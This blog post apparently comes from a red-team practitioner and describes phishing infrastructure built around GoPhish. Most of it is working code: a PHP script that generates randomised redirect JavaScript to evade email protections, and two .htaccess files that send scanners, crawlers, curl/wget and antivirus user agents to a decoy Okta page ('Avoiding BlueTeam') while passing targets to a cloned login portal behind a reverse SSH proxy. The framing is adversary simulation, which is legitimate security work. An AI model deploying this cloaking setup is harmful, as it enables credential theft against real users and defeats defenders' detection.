---
layout: post
title: "Phishing: Bypassing Protections with Dynamic Obfuscated JavaScript, PHP, and .htaccess"
date: 2025-02-26
categories: [phishing, security, PHP, .htaccess, gophish]
tags: [phishing, security, php, apache, redirect, gophish]
---

## Introduction

In this post, we detail a PHP script designed to dynamically generate JavaScript code for redirecting users while bypassing some email protections. We also explore the advanced use of Apache's `.htaccess` files to manage web traffic during a phishing campaign. 

![](/img/2025-02-26_1.png)

The GoPhish IOCs were removed, and the default `rid` value was replaced with `ogt`. You can find more info in [Phishing Campaigns: Simulating Real Adversary Tactics](https://dan1t0.com/2025/02/05/Phishing-Campaigns-Simulating-Real-Adversary-Tactics/).

## PHP Code for Dynamic Redirection

Below is the code for `redirect.php`, which validates a token (`ogt`), performs necessary checks, and generates dynamic JavaScript that redirects users to a login portal.

```php
<?php
// redirect.php
// Validate the token
if (!isset($_GET['ogt']) || !preg_match('/^[a-zA-Z0-9]{7}$/', $_GET['ogt'])) {
    die('Invalid token.');
}

$token = $_GET['ogt'];

// Generate a random variable name to obfuscate the JS code
$randomVar = substr(md5(rand()), 0, 8);
$redirectUrl = "https://login.acme-lab.com/?ogt=" . $token;

// Set HTML content header
header('Content-Type: text/html');
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Redirecting...</title>
    <script type="text/javascript">
        (function(){
            // Random variable to avoid fixed patterns in the code
            var <?php echo $randomVar; ?> = '<?php echo $redirectUrl; ?>';
            // Dynamic redirection to the login URL
            window.location.href = <?php echo $randomVar; ?>;
        })();
    </script>
</head>
<body>
    <noscript>
        If you are not redirected automatically, click <a href="<?php echo $redirectUrl; ?>">here</a>.
    </noscript>
</body>
</html>
```

### Technical Explanation

1. **Token Validation:**  
   The script checks if the `ogt` parameter exists and conforms to the expected pattern (7 alphanumeric characters). If not, the script exits.

2. **Random Variable Generation:**  
   A random variable name is generated to hold the redirection URL, which obfuscates the JavaScript code and makes it harder for automated tools to detect a fixed pattern.

3. **Dynamic JavaScript Generation:**  
   The PHP script outputs HTML that includes a JavaScript snippet. This snippet creates the randomly named variable and immediately redirects the browser to the generated URL. A `<noscript>` tag is included for users with disabled JavaScript.

## Web Traffic Flow and .htaccess Configuration

The report outlines a controlled web traffic flow using Apache rewrite rules and `.htaccess` configurations. Below is a detailed explanation of the configurations.

### Traffic Flow

1. **User Entry:**  
   The user receives a link structured as follows:
   ```
   https://lading.acme-lab.com/?ogt=3XdwYUe
   ```
   - **lading.acme-lab.com:** The domain that receives the request.
   - **ogt=3XdwYUe:** A token used for tracking.

2. **Internal Redirection:**  
   The server internally forwards the user to:
   ```
   https://lading.acme-lab.com/redirect.php?ogt=3XdwYUe
   ```
   where the PHP script (shown above) dynamically generates the JavaScript for redirection.

3. **Final Destination:**  
   Ultimately, the user is redirected to:
   ```
   https://login.acme-lab.com/?ogt=3XdwYUe
   ```
   which hosts the cloned captive portal for the campaign.

4. **Infrastructure Setup:**
   - **GoPhish Deployment:** GoPhish is hosted on an internal server that is not directly accessible from the internet.
   - **Reverse SSH Proxy:** The domain `login.acme-lab.com` acts as a proxy that forwards traffic to the internal GoPhish instance using reverse SSH tunneling. This allows external users to interact with GoPhish's phishing portal without exposing it directly.
   - **Port Forwarding:** The reverse SSH connection binds the internal GoPhish service running on port `8080` to the external-facing proxy.

### .htaccess Configurations

Two `.htaccess` files were employed, one for the landing page and another for the login portal to manage traffic effectively. Below, we detail each configuration.

#### .htaccess hosted in lading.acme-lab.com

```apache
RewriteEngine On

# 1. Check if the request is for /track
# 2. Check if the query string contains ogt parameter
# 3. Check if the user-agent is GoogleImageProxy
# If all 3 conditions are met, redirect to https://login.acme-innov.com/track?%{QUERY_STRING}
RewriteCond %{REQUEST_URI} ^/track$ [NC]
RewriteCond %{QUERY_STRING} (^|&)ogt=([a-zA-Z0-9]{7})($|&) [NC]
RewriteCond %{HTTP_USER_AGENT} via\ ggpht\.com\ GoogleImageProxy [NC]
RewriteRule ^ https://login.acme-lab.com/track?%{QUERY_STRING} [R=302,L]


# Redirect empty bots and user-agents to Okta
RewriteCond %{HTTP_USER_AGENT} "WebZIP|wget|curl|HTTrack|crawl|google|bot|b\-o\-t|spider|baidu|python|scrapy|postman|semrush|avast|Norton|Kaspersky|MSIE|trident" [NC,OR]
RewriteCond %{HTTP_USER_AGENT} =""
RewriteRule ^.*$ https://acme-labo.okta.com [R=302,L]

# If the URI is exactly /redirect.php and, if so, stops any further rewriting rules from being applied to this request.
RewriteCond %{REQUEST_URI} ^/redirect\.php$ [NC]
RewriteRule ^ - [L]

# If the URI is exactly /favicon.ico and, if so, stops any further rewriting rules from being applied to this request.
RewriteCond %{REQUEST_URI} ^/favicon\.ico$ [NC]
RewriteRule ^ - [L]

# Redirect URLs with ogt parameter to redirect.php respecting ALL query params
RewriteCond %{QUERY_STRING} (^|&)ogt=([a-zA-Z0-9]{7})($|&)
RewriteRule ^ /redirect.php [L,QSA]

# Redirect all other requests to Okta without parameters
RewriteRule ^.*$ https://acme-labo.okta.com [R=302,L]
```

#### .htaccess hosted in GoPhish for extra-evasion

```apache
RewriteEngine On

#For GoPhish tracking
RewriteCond %{REQUEST_URI} ^/track$ [NC]
RewriteCond %{QUERY_STRING} (^|&)ogt=([a-zA-Z0-9]{7})($|&) [NC]
RewriteCond %{HTTP_USER_AGENT} via\ ggpht\.com\ GoogleImageProxy [NC]
RewriteRule ^.*$ http://localhost:8080%{REQUEST_URI} [P,L]

#Avoiding BlueTeam
RewriteCond %{HTTP_USER_AGENT} "wget|curl|HTTrack|crawl|google|bot|b\-o\-t|spider|baidu" [NC,OR]
RewriteCond %{HTTP_USER_AGENT} =""
RewriteRule ^.*$ https://acme-labo.okta.com? [L,R=302]

#For Gophish
RewriteCond %{QUERY_STRING} ogt=(.+)
RewriteCond %{QUERY_STRING} js_executed=1 [OR]
RewriteCond %{QUERY_STRING} !js_executed=
RewriteRule ^.*$ http://localhost:8080%{REQUEST_URI} [P,L]

#Others
RewriteRule ^.*$ https://acme-labo.okta.com? [L,R=302]
```

## Conclusion

In this post, we showcased how a PHP script can dynamically generate JavaScript for user redirection within a phishing campaign, complemented by advanced `.htaccess` rules for traffic management. By combining server-side validation with client-side dynamic redirection and leveraging Apache's rewrite capabilities, it is possible to bypass common email protections and maintain tight control over the traffic flow.

This infrastructure setup allows GoPhish to remain internal while still serving external users through a reverse SSH proxy, reducing exposure and making detection more challenging.
